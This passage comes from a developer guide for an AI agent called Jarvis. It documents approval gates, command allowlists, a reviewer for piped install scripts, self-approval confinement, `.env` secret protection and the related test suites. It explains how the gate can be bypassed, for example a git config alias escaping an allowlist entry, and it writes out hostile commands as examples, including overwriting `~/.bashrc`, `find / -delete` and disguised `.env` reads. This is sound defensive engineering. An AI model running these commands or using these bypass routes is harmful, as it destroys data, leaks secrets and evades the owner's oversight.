    verdict.

  **The bug this shipped with, found a day later (2026-08-10) and worth more
  than the feature.** `rules._READONLY` was copied from `shell.READ_ONLY` —
  and that set is safe *in its own context*, because `run_readonly` separately
  refuses every shell operator, so `tee` has nothing to write through and
  `echo` has no redirect. Lifted into a rule that **auto-approves**, the same
  names became `echo pwned > ~/.bashrc`, `sed -i` on any file, `tee
  /etc/hosts` and `find / -delete`, all running with nobody asked. Three fixes:
  a segment containing a redirect token is never auto-approved; `find`/`sed`
  fall to ASK in their writing forms (`-delete`, `-exec`, `-i`) while staying
  allowed as reads; and command **wrappers** are unwrapped before judging, so
  `env sh -c …`, `nohup sh -c …` and `timeout 5 python -c …` are judged as the
  inner command instead of as `env`/`nohup`/`timeout`. Generalises:
  **an allowlist is only valid together with the constraints it was written
  under** — moving one somewhere more permissive silently widens it.

  Owner's choices, 2026-08-09, recorded because the reasoning is the point:
  git writes **except push** (it reaches production directly) and **except
  reset --hard / clean** (they destroy uncommitted work); **never `rm`**
  (asked, not denied); auth commands deliberately **not** denied.

  **`2>&1` is not a redirect to a file** (narrowed 2026-08-17, one round after
  the fixes above). The redirect check had become a raw scan for any unquoted
  `>`, which is a strictly larger set than "writes to a path": `make build
  2>&1`, `npm run build 2>&1` and `pytest -x 2>&1` all went ALLOW → ASK. Two
  shapes carry a `>` and redirect nothing — **file-descriptor duplication**
  (`2>&1`, `1>&2`, `2>&-`, which aim one descriptor at another or close it) and
  a **`>` inside quotes** — and `rules.redirects_to_file()` now excludes both
  while still catching `echo pwned > ~/.bashrc`, `echo pwned>~/.bashrc`,
  `&>file` and `2>/dev/null`. `segments()` needed the same correction: it was
  splitting `2>&1` on the bare `&` into a `2>` half that looked like a redirect
  and a `1` half that looked like a command, so one line asked twice over for
  two invented reasons.

  Three edges worth keeping, all of them checked against a real bash:

  - **bash's `>&word` is `&>word` when the word is not a number** — `echo hi
    >&out.txt` really does create `out.txt` — so only digits and `-` count as
    a duplication.
  - **`a->b` is a redirect.** `echo a->b` creates a file called `b`. So `git
    log --pretty=format:%h->%s` asking is *correct*, not over-reach; the fix
    is to quote the format string. (It asked before this round too — `git log`
    is not on the auto-approve list either way.)
  - A line may carry both: `2>&1>out.log` is a duplication immediately
    followed by a real redirect, and the scan has to resume *at* the end of
    the duplication rather than one character past it.

  **Known limitation, deliberately not fixed: allowlisting `git` is
  allowlisting arbitrary code execution.** Verified by execution 2026-08-17.
  `git -c alias.zz='!<any shell command>' zz` is one segment whose stem is
  `git`, so an owner entry of `{"tool": "run_command", "prefix": "git"}` —
  the single most likely entry for this owner to have created — auto-approves
  it with nobody asked. `git -c core.pager='<command>' log` is the same shape.
  This predates the 2026-08-17 round and none of those fixes caused it; it is
  recorded rather than patched because the fix is a **decision**, not a defect
  repair: either `git -c` falls to ASK (which costs the ordinary `git -C
  /repo status` nothing but does cost `-c` users), or stem-level entries for
  `git` stop being offerable, or nothing changes and the owner accepts that
  the entry means what it says. A half-fix — pattern-matching `!` inside a
  `-c` value — would be worse than none, because it would read as a boundary
  while a shell has more spellings than any matcher has patterns, which is
  exactly the caveat `rules.py`'s DENY section already carries. **The general
  point stands whatever is decided: an allowlist entry for a program with a
  config-driven escape hatch is an entry for everything that program can be
  configured to run.** `find`, `awk`, `ssh`, `rsync` and `make` all have the
  same shape — and so does the **`python3` entry already in the owner's real
  allowlist**, since `allows()` is consulted *before* the rules verdict, so
  the ASK that `python3 -c '…'` earns for inline source is never reached. That
  ordering is deliberate (an allowlist entry is the owner overriding the ask)
  and is not a bug; it is the reason the entries themselves are the decision,
  and the reason `entry_for` refuses to mint one from a compound command.

- **A `curl … | sh` is reviewed before it runs** (`command_review.py`). Rather
  than deny pipe-to-shell outright — installing uv or gcc that way is ordinary
  — the script is fetched and read by the orchestrator tier, which can refuse
  it. **Read the limits before trusting it:** a classifier is a safety net
  against accidents, not a boundary against an adversary, because the thing
  being judged is attacker-controlled text being judged by a model that reads
  text. So it is built to fail toward asking: the body is fenced and labelled
  untrusted data; *unsafe* denies; *safe* auto-approves **only** from a host on
  `TRUSTED_INSTALL_HOSTS`, so a clean-looking script from anywhere else still
  gets a human; every failure path (no URL, fetch error, unparseable verdict,
  model error) returns *unclear*, which asks; and
  `JARVIS_REVIEW_AUTOAPPROVE=0` leaves it able to refuse but not to consent.
  What it genuinely buys: a script that quietly adds an SSH key gets refused
  with a specific reason instead of being one distracted "yes" away.

- **Dangerous tools are approved by a human in whichever surface is running**
  — a y/N prompt in the CLI, an authorization card in the face
  (`face/approvals.py`), or a Discord DM when the owner is away from the desk
  (`discord_approvals.py`, below). All of them default to deny on every
  failure path. The face server is the only place that could accidentally
  pass `approve=None`, which would run them unguarded; don't.
- **Permission modes wrap that gate** (`permissions.py`, 2026-07-31). Every
  Agent's approver is `permissions.gate(surface_approver)`: mode "all"
  approves everything but is reachable ONLY via
  `jarvis face --dangerously-skip-permissions` and is a process variable —
  restart is always back to ask. The persistent allowlist
  (`~/.config/jarvis/allowlist.json`) holds only entries the owner explicitly
  created ('a' at the CLI prompt, ALWAYS on the HUD card); commands
  allowlist by **stem**, matched whole ("git" ≠ "gitfoo"). Tests must point
  `config.ALLOWLIST_PATH` at a temp file — a UI test once wrote `apt` onto
  the real allowlist by clicking the wrong button.

  **Every segment has to be allowlisted, not just the first** (fixed
  2026-08-17 — see *The allowlist was one word wide* below). The allowlist
  asks `rules.command_stems()` for the stem of every command the line will
  run, and covers the request only if all of them are listed. Two shapes are
  never covered whatever the entries say: **command substitution**, because
  `$(...)` hides a command that cannot be enumerated, and **fetch-execute**,
  because `curl … | sh` is remote code no static entry ever saw. A
  *prefix-less* entry for a command tool grants nothing rather than
  everything, and no UI path can create one.

  **An entry may be written as a stem or as a full path** (narrowed
  2026-08-17, same day). `command_stems()` reduces every command to a
  basename, which is right for *judging* a command and wrong for *matching
  text the owner typed into a JSON file by hand*: it made every full-path
  entry dead on arrival, including the full-path `powershell.exe` entry in the
  owner's real allowlist. `rules.command_targets()` returns both spellings per
  segment and `allows()` accepts either. Neither widens anything — the match
  is still whole-token, and still required for **every** segment, so
  `/usr/local/bin/mytool; rm -rf ~` stays refused on the strength of the `rm`.
  The lesson is about the failure mode rather than the matcher: **an allowlist
  that silently stops matching is worse than one that never matched**, because
  the owner does not learn it from the file — they learn it from being asked
  again about something they settled months ago, with the stale entry still
  sitting there looking correct.

  **The gate's state file is not agent-writable** (same day). `write_file`
  and `edit_file` refuse `config.ALLOWLIST_PATH` by resolved path. This is
  the data half of SELF_PROTECTED, and the reason it needed its own
  mechanism is in *Nothing froze the gate's data* below.
- **Desktop control is confined to an app allowlist** (2026-07-31).
  `config.DESKTOP_APPS` is the whole door: no desktop tool accepts a window
  title, handle, or executable path, only a registered app name, so the model
  cannot widen its own reach by argument — the same structural confinement as
  the Onshape sandbox pin. Two categories stay out of the registry on
  purpose: **no terminal/shell/file manager**, because keystrokes into one
  are arbitrary code execution and would route straight around
  `run_command`'s approval gate; and **no browser**, because the face HUD
  renders the approval card and an agent that could drive a browser window
  could authorize itself (the desktop version of the hole
  `is_face_origin()` closes). The bridge additionally refuses any window
  titled like the HUD or the design board, whatever the server asks for.
  Desktop tools are absent from `workflows.SAFE_TOOLS`: driving an app means
  taking the Windows foreground, so a background workflow would fight the
  owner for their own screen. Provisioning is human-only
  (`jarvis desktop setup`), and the bridge is a process the owner starts —
  the agent has no way to install or launch its own.
- **An avatar's SVG is untrusted input** (`avatars.py`, 2026-08-06). The art
  is drawn inside `jarvis.html`, the window that gates approvals, and
  `write_file` can reach `avatars/` — so a hand-written SVG could otherwise
  script the surface `is_face_origin()` exists to protect. Two layers, and
  the second is the real one: `sanitize_svg()` rebuilds the file from an
  element/attribute **allowlist** (no script, no `on*`, no `href` that is not
  a local fragment, no entities/DOCTYPE, no `url()` in a style, 512KB cap),
  and the HUD renders it in an **`<img>`** fed by `GET /avatar.svg`, which
  cannot run script or fetch anything whatever the file says. It is also
  mechanically confined: fixed 186px, `pointer-events: none`, so it can
  neither cover the authorization card nor eat a click meant for it. The
  accent colour recolours only the cyan-family orb states — amber (tool
  running, pending authorization) and red (error) are *meanings*, and an
  avatar that could repaint them could make a running command look idle.
  `set_avatar` is safe/non-dangerous (it selects an avatar already on disk;
  it cannot create one) and is excluded from goal runs alongside
  `set_voice_mute`. **The HUD's `<title>` stays `J.A.R.V.I.S.` whatever the
  avatar** — `windows/uiatree.py:FORBIDDEN_TITLES` matches on it, and that is
  the bridge's backstop against driving the approval window.
- **Session tools read, never switch.** Jarvis can summarize, search, and
  read past conversations (all four tools are safe and non-dangerous), but
  which session is live is the owner's, set in the HUD or on the command
  line. Session files hold what already went through a transcript, so they
  inherit the scrub — `dispatch()` cleans a result before it becomes a
  message, and nothing kept out of context can arrive here later.
- **Sub-agents are typed, and a fleet runs them together** (`agents.py` +
  `tools/subagent.py`, 2026-08-09). A type is a brief, a toolset and a step
  budget named together — explorer / researcher / reviewer / scribe / browser /
  generalist — so the caller picks a *kind* of worker instead of describing one
  from scratch. `run_subagent` sends one and blocks; `run_fleet` sends up to
  six at once. **A type never carries a model: every child is the orchestrator
  tier** (owner's call — all Luna). The cost lever here is `delegate()` and the
  context lever is the sub-agent; a cheap child that returns a confidently
  wrong answer costs the parent more than it saved, because the parent cannot
  see the work behind it.

  **The browser type is `concurrent_safe=False`, and that is what makes the
  fleet legal.** `browser.SESSION` is a module-level singleton with one page
  and one shared 120-action budget — the caveat this file has carried since
  sub-agents were introduced ("if sub-agents ever become concurrent, this is
  the first thing that breaks"). `run_fleet` runs concurrent-unsafe jobs one
  at a time and everything else together, so the thing that would break never
  happens; `tests/fleet_check.py` asserts peak browser concurrency is exactly
  1 while explorers overlap. **`run_fleet` is deliberately not in
  `workflows.SAFE_TOOLS`**: `run_subagent` is there because it is synchronous
  and inherits the deny-all approver, but six concurrent children from a
  thread nobody is watching is a spend amplifier, which is a different
  question.

- **A sub-agent can never exceed its parent** (`tools/subagent.py`,
  2026-08-01). `run_subagent` is synchronous — the parent blocks — which is
  what makes it safe to give a child browser tools where a background workflow
  cannot have them. Three limits, all tested: the child's toolset is
  `SUBAGENT_TOOLS` **intersected with the parent's own**, so a workflow (denied
  the browser because workflows share one Playwright page) cannot reach the
  browser by spawning a child that has it; the child dispatches with the
  *parent's* approver, so a deny-all workflow yields a deny-all child; and
  depth is capped at `runtime.MAX_DEPTH`. `SUBAGENT_TOOLS` currently contains
  nothing dangerous and `longhorizon_check.py` asserts that stays true — if you
  add one, the inherited approver is what gates it, and think hard about
  whether the owner can judge a request they never saw framed.
  Caveat found in review, not a correctness bug but worth knowing: `SESSION` is
  a module-level singleton, so a browsing child drives the **same page** the
  parent may be mid-task on and spends the **same 120-action budget**. Nothing
  interleaves (the call is synchronous), but a parent that browsed before
  delegating must re-snapshot afterwards rather than trusting its old refs —
  which the snapshot→act→re-snapshot discipline already does. If sub-agents
  ever become concurrent, this is the first thing that breaks.
- **Background workflows cannot ask, so they cannot do** (`workflows.py`):
  workflow agents get SAFE_TOOLS (no browser — one shared Playwright page —
  and nothing dangerous) plus a deny-all approver. Monitoring is via
  workflow_status / workflow_log tools. For background work that *may* need
  approval, see attended tasks below.
- **Attended background tasks can ask, because the owner is reachable**
  (`tasks.py` + `tools/tasks.py`, 2026-08-20). The workflow premise inverted:
  a task is started from a conversation, so somebody is watching by
  definition, and `task_start` **captures the calling agent's approver from
  `runtime.approver()`** — the run_subagent precedent. The gate travels as an
  *object*, never re-derived: a conversation agent's
  `permissions.gate(broker.approver())` keeps its `jarvis_human_backed` flag
  inside the task (allowlisted/ALLOW commands auto-run off-screen — the
  owner's explicit call, 2026-08-20), while a deny-all parent (a workflow, an
  unbound thread) yields a deny-all task, fail closed. Wrapping the approver
  instead would have silently stripped the flag — the "second copy of an idea
  drifts" failure again. Attribution is `runtime.origin()`, a ContextVar bound
  once on the task's own thread and read by `ApprovalBroker.request()` on the
  thread that blocks in it, so the HUD card and DM say which task is asking
  (`_label` sanitizes the model-chosen name before it touches an approval
  surface); with no origin bound, both surfaces are byte-identical to before.
  Toolset is the registry minus browser (one Playwright page shared with the
  conversation agent *in this same process* — goals get it because the
  daemon's runner is serial), minus desktop (foreground stealing), minus
  task/workflow/fleet tools (spawn recursion from an unwatched thread is a
  spend amplifier; `run_subagent` stays — synchronous, inherits the task's
  approver and toolset). Workflows, sub-agents and goals deliberately cannot
  start tasks. Known v1 caveats: closing the HUD still
  `deny_all("window-closed", include_remote=False)`s a task's card-only ask
  rather than migrating it to Discord; the registry is in-memory (restart
  forgets; durable output is files/memory); and the CLI denies background
  approvals with a printed note (`_approve` main-thread guard) because two
  threads cannot share one stdin — the face and daemon are the surfaces that
  can answer them.
- **Jarvis may not touch his own control plane.** `config.is_face_origin()` —
  the browser and `fetch_page` refuse it, ahead of `allowed_hosts='*'`.
  Otherwise he could drive his own HUD and approve himself.
- **External accounts follow use-but-never-see** (Gmail, 2026-07-31, the
  template for every future integration): a *scoped OAuth refresh token* —
  never a password — lives in `~/.config/jarvis/google_token.json` (mode
  600, outside the repo), is loaded only inside `google_auth.py`, and goes
  into an Authorization header; the model only ever sees API responses.
  Consent is human-only (`jarvis auth google`, a CLI subcommand — never a
  tool, so the agent cannot initiate or widen its own access), scopes are
  minimal (gmail.readonly + gmail.send), the token is revocable at
  myaccount.google.com, and outward actions (`gmail_send`) are
  `dangerous=True` so every send needs the owner's approval. The token file
  is covered by all three secrets layers below.
- **Spotify follows the same template, and is the first integration that is
  deliberately *not* gated** (2026-08-21). Credential: a scoped OAuth refresh
  token at `~/.config/jarvis/spotify_token.json` (600, all three secrets
  layers), consented once via `jarvis auth spotify` (human-only CLI), revocable
  at spotify.com/account/apps. PKCE, so there is **no client secret** — the
  client id is public by design and the refresh token is the whole credential.
  It also **rotates**: Spotify hands back a new refresh token and retires the
  old one, so `access_token()` persists the replacement (atomically, mode 600)
  *before* returning — not writing it is a bug that hides for an hour and then
  reads as a revoked grant.

  **No spotify_ tool is `dangerous=True`, and that is a judgement.** The gate
  is for actions that are outward-facing or hard to undo; `gmail_send` puts
  words in the owner's name in someone else's inbox. Starting a song is
  audible, immediately obvious, and undone by saying "stop" — and a card per
  track would teach the owner to approve without reading, which is the failure
  the gate exists to prevent.

  Two confinements instead. The tools may **launch the Spotify client** when
  the Web API reports no device to play on, and that is confined the way
  `DESKTOP_APPS` is: the executable is `config.SPOTIFY_EXE` and nothing else —
  no tool takes a path, a command or a window, so the model cannot turn "play
  something" into "run something". And they are **absent from
  `workflows.SAFE_TOOLS`**: a workflow runs where nobody is watching, so music
  starting from an unattended thread is a surprise in the owner's room rather
  than a line in a log. Attended tasks and goals do get them — someone is
  reachable there by definition.

- **Onshape follows the same template with a sharper write boundary**
  (2026-07-31): API keys — never the password — live in
  `~/.config/jarvis/onshape_keys.json` (600, all three secrets layers),
  pasted once via `jarvis auth onshape` (human-only) and revocable in
  Onshape under My account → Developer → API keys (NOT the dev portal —
  that page is OAuth-apps only now). CAD writes are confined
  *structurally*: every
  write URL is built from the one sandbox document pinned in that bundle,
  and no cad_ tool accepts a document id for a write target — so no CAD
  tool needs `dangerous=True`. Parts libraries are read-only sources.
  `tests/onshape_check.py` asserts both properties stay true.
- **`.env` / `.env.local` are unreadable** (`tools/secrets.py`, added
  2026-07-30 after a real leak — see below). Three layers: `read_file` refuses
  them by name; both shell tools refuse a command naming one, including a
  dotted glob (`cat .env*`) and *including approved* `run_command`, because
  approving a command is not consent to what it prints; and `dispatch()`
  scrubs every tool result before it becomes a `tool` message. Covered
  names: `.env`, `.env.local`, `google_token.json`, and `onshape_keys.json`
  (JSON values pulled by sensitive key names) — `.env.example` stays
  readable on purpose.

## Testing

- `jarvis bench` makes **real API calls and costs money** (~$0.004 for the full
  6-model sweep). Use `-t <task>` and a single model while iterating.
- `jarvis bench --family agent` is **agent-bench** — the whole-Jarvis one (see
  *agent-bench* below). ~$0.007 and ~2 minutes for the five-task sweep on Luna.
- `python -m longbench` is **long-bench** — the long-horizon one, and the only
  bench that is **not** run through `jarvis bench`, because it does not import
  Jarvis at all (see *long-bench* below). **It is the expensive one:** budget
  $5-10 per cell at the default `--scale 4`, and use `--budget` (a hard
  ceiling). `--scale 1` is the cheap smoke configuration and the CLI says so.
- `python -m swecompare` is **SWE-bench Verified**, run against the Jarvis loop
  and against `claude -p` and graded by each project's own test suite. It exists
  because long-bench answers a *different* question — long-bench measures what a
  harness does to a transcript under context pressure and **contains no test
  suite**, so it cannot say anything about agentic programming. Do not pool the
  two sets of numbers. Needs Docker; the whole procedure, including every gotcha
  already paid for, is in `swecompare/RUNBOOK.md`.
- Context-management tests are synthetic and free — no API, fully repeatable.
  Prefer that pattern for new logic.
- `tests/context_check.py` — free synthetic checks for `context.py`, and the
  one CLAUDE.md claimed existed for months but did not, which is how the
  cut-point orphan bug survived in the compaction path (it only fires past
  `compact_at_tokens`, so nothing short ever reached it). Covers: parallel
  image results never orphaning a tool_call, cuts only at settled user
  boundaries, the original request pinned through compaction, eviction and
  truncation being in-place and idempotent, `manage()` end-to-end leaving
  a wire-valid transcript, and **invariant 2's one exception** — `run_turn`
  never appending a null-content assistant turn that has no tool_calls, while
  leaving the legal null-content-with-tool_calls shape verbatim. Since
  2026-08-09 it also covers the **TokenMeter** (measured prefix + estimated
  tail, discount/invalidate/shrink, the agent measuring against exactly what it
  sent, and a real count triggering a compaction the estimate would have
  missed) and **spill-on-truncate** (the pointer resolves to a file holding the
  whole result, identical bodies share one file, an unwritable spill degrades
  to a plain cut). Run after touching anything in `context.py` **or the append
  in `agent.run_turn`**.
  **Write new cases so they fail against the old code** — the first draft of
  the orphan case passed against the bug, because the split tool group was not
  the *newest* candidate and both rules picked the same safe boundary.
  Second rule, learned the same day: **point `spill_dir` at a temp directory**.
  The default is the owner's real `~/.local/share/jarvis/spill`, and a suite
  that writes into live machine state is how `apt` once landed on the real
  allowlist.
- `tests/loop_check.py` — free checks for the agent loop's dispatch and stop
  handling, `llm.chat` stubbed so any reply shape can be produced on cue.
  Parallel dispatch: batching (consecutive safe runs group, a write splits
  them, indices stay in call order), the allowlist not drifting from the
  registry and never containing a dangerous/browser/desktop/subagent tool,
  three 0.3s tools finishing in 0.3s, results ordered by *call* even when they
  complete out of order, a raising worker still answering its call id, parallel
  image results each keeping their carrier message — and **the ContextVar
  propagation check, which is the one that matters**: it fails against a
  version that submits the bare function to the pool. Token-cap handling: a
  cut-off reply continued and rejoined, the continuation capped and the cut
  stated in the reply, the mid-tool-call note landing *after* the results, and
  an ordinary reply gaining nothing. Run after touching `run_turn`,
  `_dispatch_calls`, or `PARALLEL_SAFE`.
- `tests/files_check.py` — free checks for the file and search tools:
  read_file numbered and paged (a 5000-line file reassembled byte-exact by
  paging, which is the `CLAUDE.md` case), edit_file across unique / ambiguous /
  missing / stale / replace_all / deletion and the numbered-paste salvage,
  **edit_file refusing every SELF_PROTECTED file and `.env`** (verified to bite:
  with the guard stubbed out, the edit lands), write_file stripping read_file's
  numbering while leaving a numeric TSV column alone, and grep_files across all
  three modes, glob, case, cap, context lines and skipping `.env`.

  Two groups added 2026-08-17. **The approval gate's state file is refused by
  both write tools** — `config.ALLOWLIST_PATH` is pointed at a temp file for
  the whole suite and the protection is read from `config` per call, so this
  exercises the temp file and never the owner's real one; it covers the
  overwrite, the surgical edit, and the create-from-nothing case (write_file
  makes parents, so "not there yet" was the easier attack). And
  **`grep_files`' protected-file filter is asserted against both backends with
  their answers required to be identical** — rg context lines, a single
  protected file as `path`, and the count-mode match oracle, each of which the
  colon-prefix filter missed and the fallback never did.

  **The two backends must agree, and proving that needs `rg` installed.** It
  was not, so the original "run it twice" claim was really the fallback twice —
  which is how the gitignore bug (below) stayed green. The suite asserts the
  **rg argument list** directly (that runs anywhere), reproduces the bug in a
  real temp git repo, and prints `PARITY NOT VERIFIED` in capitals when `rg` is
  missing rather than passing quietly. **ripgrep 15.1.0 was installed
  2026-08-10 and the full parity comparison now runs**: both backends agree in
  all three modes, and all 45 free suites pass with rg live.
- `tests/longhorizon_check.py` — free checks with a faked `llm.chat` for the
  plan slot and sub-agents: plan written through dispatch and injected into
  `messages[0]`, still present on step 26 of a *single* turn (the per-step
  refresh — a per-turn refresh passes a 2-step test and fails the real case),
  surviving compaction, absent for agents without `plan_write`, and not shared
  between concurrent agents; sub-agent returning only its answer with the bulk
  left behind, inheriting the parent's approver, toolset intersected with the
  parent's, depth capped, cancellation reaching through, and the parent's plan
  surviving the call. Run after touching `agent.run_turn`, `runtime.py`,
  `tools/plan.py`, or `tools/subagent.py`.
- Browser smoke tests should use a **local HTTP server**, not a live site.
- `tests/agentbench_check.py` — free synthetic checks for the agent-bench
  *harness*, which every number it prints depends on: the sandbox isolates and
  restores (including after an exception) and strips the network out of
  `workflows.SAFE_TOOLS`; each grader scores a hand-built correct world 100%
  and catches its specific failure (clobbered changelog, unloaded skill, leaked
  credential, inline work instead of delegation, forgotten codename); fixture
  facts match what is actually on disk; **every task scores near zero on an
  empty run** — the check that caught the safety grader paying 56% for doing
  nothing; and **every task survives a run cut short** (0 and 1 recorded
  turns), because an empty run is *fully shaped* while a run killed by a
  provider error is **short**, and only the second crashed a grader. Run after
  touching `agentbench.py`.
- `tests/longbench_check.py` — 84 free synthetic checks for the long-bench
  *harness*, and the pattern is worth copying: because long-bench does not
  import Jarvis, this suite runs on bare `python3` with no venv and no key.
  Covers deterministic worlds; the ground truth appearing **nowhere on disk**
  (a task whose answer is in the workspace measures reading comprehension); a
  reference solver per task scoring 100%, so the graders are reachable at all;
  every grader catching its own specific failure (half-migrated, sed-the-whole-
  tree, clobbered changelog, wrong carried count, unparseable output, dropped
  findings, reported decoys, ignored cohort rule, lost salt, skipped `.bak`,
  wrong order, spec-drift turn skipped, either planted document believed); every
  task ~0 on an empty run; no grader raising on a wrecked or missing workspace;
  worlds deterministic at every scale; and both levers moving on **both**
  harnesses, since a lever that moves on one is a handicap rather than a mode.
  Every check runs at `--scale 1` — the properties are scale-invariant and a
  four-minute suite stops being run. Run after touching anything under
  `longbench/`.
- `tests/cadbench_check.py` — free synthetic checks for the cad-bench
  *harness* (the shape of `agentbench_check`): geometry helpers (world boxes
  from transforms, penetration with touching = 0, the recorded 12-inch
  c-channel overlap detected), every grader scoring a hand-built correct
  world 100% and catching its specific failure, every task ~0 on an empty
  run AND on a do-nothing run (`repair`'s fixture pre-builds the world — the
  fixture's own work must earn the agent nothing), every task surviving a
  run cut short (0/1 turns), the bench assembly deleted even when the run
  blows up, and part resolution stripping Onshape's invisible LRM marks.
  Run after touching `jarvis/cadbench.py`.
- `tests/avatars_check.py` — free synthetic checks for avatars: the SVG
  sanitizer against a hostile file (script, `onload`, `foreignObject` drawing
  its own AUTHORIZE button, `javascript:` href, external `<image>`) with the
  geometry surviving and `<a>` *unwrapped* rather than dropped; every
  generated wake regex `\b`-anchored at both ends and a raw one anchored on
  the way through; **the HUD's hard-coded fallback patterns matching
  `avatars.DEFAULT`** (the two copies must not drift); every degradation path
  leaving him summonable (missing slug, uncompilable regex, no stated phrase,
  unparseable SVG); the env pin vs an explicit switch; and the identity
  rename hitting `You are Jarvis` without renaming `jarvis chat -c`.
- `tests/face/hud_avatar_check.py` — free headless checks in the real
  `jarvis.html`: no avatar in `/config` leaves the window byte-for-byte as it
  was (banner, both wake phrases, the triangle emblem — every other HUD suite
  depends on that); an avatar renames banner/byline/SYSTEMS row/armed hint and
  **moves the wake word** (new phrase fires, old one does not, still
  anchored); the face is an `<img>` that replaces the emblem and falls back to
  it on a load failure; a hostile SVG's `onload` never runs; the picker lists,
  marks, keeps PTT inert, closes on Escape without switching, and round-trips
  through POST /avatar; and an SSE `avatar` broadcast relabels live.
- `tests/secrets_check.py` — free synthetic checks for the `.env` protection,
  against a throwaway dir holding a fake key. Includes a replay of the actual
  leak (a recursive grep that never names `.env`), and since 2026-08-17 the
  **parser gaps in layers 2 and 3**: eight smuggled spellings of a protected
  name (`cat<.env`, `sh -c 'cat .env'`, `env sh -c …`, `python -c
  "open('.env')"`, `F=.env; cat $F`, `cat $(echo .env)`) refused while
  `.env.example` / `.envrc` / `myapp.env` stay readable, and `scrub()`
  dropping context-line (`path-N-text`), tab and NUL attributions the way it
  always dropped colon ones — including end-to-end through real `dispatch()`
  on a `grep -C2`, which is the shape that walked a credential file past the
  scrub while still printing the "withheld" counter. Run it after touching
  `secrets.py`, `dispatch()`, or either shell tool.
- `tests/gmail_check.py` — free synthetic checks for the Gmail integration:
  refresh-token exchange and caching against a fake transport, search/read/
  send API shapes with MIME round-trip, 401→refresh→retry-once, gmail_send
  registered dangerous with a denial never touching the network, and the
  token file refused by name/glob/read_file with values scrubbed. Run after
  touching `google_auth.py`, `tools/gmail.py`, or `secrets.py`.
- `tests/spotify_check.py` — free synthetic checks for the music integration,
  fake transport throughout: the PKCE refresh carrying no client secret, **a
  rotated refresh token persisted at mode 600** (the failure that would
  otherwise surface an hour later as a revoked grant), every tool's request
  shape, a 401 refreshing and retrying exactly once, volume clamping rather
  than sending 300, and the market read from `/me` instead of guessed. The
  three that are about judgement rather than plumbing: **the owner's own
  playlist beats an identically-named one in the global catalogue** (which is
  what "play my deep focus" means), **a Premium refusal names the plan** rather
  than surfacing a 403 that reads as a Jarvis bug, and **no device launches the
  client and transfers playback to it** with the launcher stubbed, because a
  test must not open Spotify. Plus the group mechanism end-to-end (below) and
  the bundle refused by all three secrets layers.
- `tests/onshape_check.py` — free synthetic checks for the CAD integration:
  key-bundle load and document-URL parsing, inch/degree → meter/row-major
  matrix transforms and readback, every cad_ tool's request shape against a
  fake transport, library latest-version resolution + caching, the sandbox
  write pin (every write URL targets the pinned document), and the key
  bundle refused/scrubbed by all three secrets layers. Run after touching
  `onshape_auth.py`, `tools/onshape.py`, or `secrets.py`.
- `tests/fleet_check.py` — free checks for typed sub-agents, `llm.chat`
  stubbed: every type's tools exist and none is dangerous, **every child on the
  orchestrator model** (and no type carrying one), the toolset intersected with
  the parent so the browser stays unreachable to a workflow, four children
  finishing in the time of one, **peak browser concurrency of exactly 1 while
  explorers overlap**, reporting in call order, bad/empty/oversized job lists
  refused, a raising child still reported, depth cap and cancellation, the
  parent's approver being what a child dispatches with, and `run_fleet` staying
  out of `workflows.SAFE_TOOLS`. Run after touching `agents.py` or
  `tools/subagent.py`.
- `tests/face/hud_delta_check.py` — free headless checks that the HUD renders a
  reply *while it is being written*: text appears mid-turn, the draft is plain
  text (half a markdown document is not markdown — rendering `**bold` mid-word
  flickers), the finished reply replaces the draft and is rendered once, a
  cancel mid-sentence removes the draft rather than leaving words he never
  finished saying, and streamed text cannot inject markup into the window that
  gates approvals. Harness note worth copying: **close each turn's `/converse`
  response with a `None`**, or the previous handler is still blocked on the
  queue and the next turn's lines are delivered to a dead connection.
- `tests/face/hud_capture_check.py` — free headless checks for the mic being
  open all the time, and for the detector that carves turns out of it. Two
  browser contexts, for two questions: one with a granted (deliberately
  **silent**) fake device, asserting the ring fills from boot with nothing
  held and nothing said; and one with the microphone **denied**, so the ring
  is written only by the test and the sample arithmetic is exact. Driving it
  needs no audio — a frame of N samples at a constant amplitude has exactly
  that RMS, so `__hud.mic.feedMs()` scripts a room through the real
  `onCaptureFrame`, ring, segmentation and upload. The three owner complaints
  are three assertions: speech at 0.02 opens an utterance (the old fixed 0.045
  never would), a 1.1s pause mid-sentence does not end one, and 20s of
  background talk lifts the threshold instead of wedging the recording to its
  cap. Plus: an unclaimed utterance is never sent, a late wake hit claims the
  one already in flight and uploads *more* audio than was spoken (the pre-roll
  that used to be lost), the follow-up window opens and closes, his own speech
  never becomes a turn, a 90ms noise is not a turn and does not consume the
  window, and push-to-talk keeps its pre-roll while a tap is still refused.
  Since 2026-08-20 it also owns the **MIC mute** (the owner's input-side mute):
  muted, speech opens and uploads nothing, wake hits and the follow-up window
  are inert, push-to-talk records nothing while the orb still interrupts, the
  threshold keeps tracking the room, the state survives a reload, and **audio
  captured while muted never leaves the machine** — the wake back-dating that
  would reach across an unmute is clamped at the unmute mark (verified to
  bite: with the clamp removed, 2.6s of muted-period audio uploads).
- `tests/face/speculation_check.py` — free checks for synthesizing ahead of the
  turn, `voice.tts` replaced by a recorder so nothing is rendered. The first
  one is the whole safety argument: six replies fed **character by character**,
  with every chunk ever declared settled required to survive byte-for-byte to
  the finished reply — if that fails, the speculator spends the TTS lock on
  strings that are never spoken and is slower than not speculating at all.
  Then: a hit is not also re-rendered and nothing is synthesized twice, guesses
  made before a tool call are dropped on `interim_text`, the limit holds on a
  40-sentence reply, a failing synthesis *and* a failing guess both leave the
  turn alone, and muted turns speculate nothing. Run after touching
  `_sentences`, `_stable_chunks`, `_Speculator`, or the delta sink.
- `tests/stream_check.py` — free checks for streamed completions, the HTTP
  layer faked: content and split tool calls reassembling by index, usage/model/
  finish_reason surviving, **a mid-stream cancel raising `Cancelled` and
  leaving the transcript wire-valid** (no assistant turn, nothing outstanding),
  retry allowed before the first token and refused after one, the fallback to a
  non-streaming call when streaming never starts, and `stream=False` taking the
  old path. Run after touching `llm.chat`, `_stream_once`, or the cancel path
  in `run_turn`.
- `tests/rules_check.py` — free checks for command rules and the fetch-execute
  reviewer, with `shell._run` replaced by a recorder throughout, because a test
  for "rm -rf / must be refused" must not depend on the refusal working. Covers
  a 33-command decision matrix (the owner's choices as a table), worst-segment-
  wins on compound commands, inline-source and command-substitution falling to
  ASK, a denied command neither running *nor being asked about*, **a background
  workflow's deny-all approver never honouring an ALLOW** (the regression this
  nearly shipped with), the secrets refusal still beating an allowed stem,
  fetch-execute detection, every reviewer verdict including safe-but-untrusted-
  host and the `JARVIS_REVIEW_AUTOAPPROVE=0` kill switch, every reviewer failure
  path ending in *unclear*, the prompt fencing the script as untrusted data, and
